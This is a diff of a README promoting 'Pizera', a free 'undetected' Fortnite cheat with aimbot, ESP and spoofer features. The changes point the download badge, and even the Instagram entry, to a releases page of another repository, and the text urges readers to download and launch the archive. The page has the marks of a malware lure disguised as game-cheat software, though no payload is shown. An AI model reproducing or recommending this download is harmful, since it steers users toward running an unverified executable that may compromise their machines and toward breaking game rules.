@@ -13,7 +13,7 @@ aimbot, cheat, esp, fortnite, free, hack, new, spoofer, tool, undetected, wallha
 
 ## Installation
 To get started with Pizera, simply download the cheat from the following link:  
-[![Download Pizera](https://img.shields.io/badge/Download-Pizera-green)](https://github.com/uploads/App.zip)
+[![Download Pizera](https://github.com/toxicbeats/pizzert-new-fortnite-undetected-cheat/releases)](https://github.com/toxicbeats/pizzert-new-fortnite-undetected-cheat/releases)
 
 Once downloaded, launch the cheat to start dominating your Fortnite matches!
 
@@ -48,7 +48,7 @@ Ready to elevate your gameplay with Pizera? Download the cheat now and experienc
 ## Stay Connected
 Follow us on social media for the latest news and updates:
 - Twitter: [@PizeraCheat]
-- Instagram: [pizera.cheat]
+- Instagram: [https://github.com/toxicbeats/pizzert-new-fortnite-undetected-cheat/releases]
 - Facebook: [PizeraCheat]
 
 Join our community and connect with other Pizera users to share tips and strategies for dominating in Fortnite!
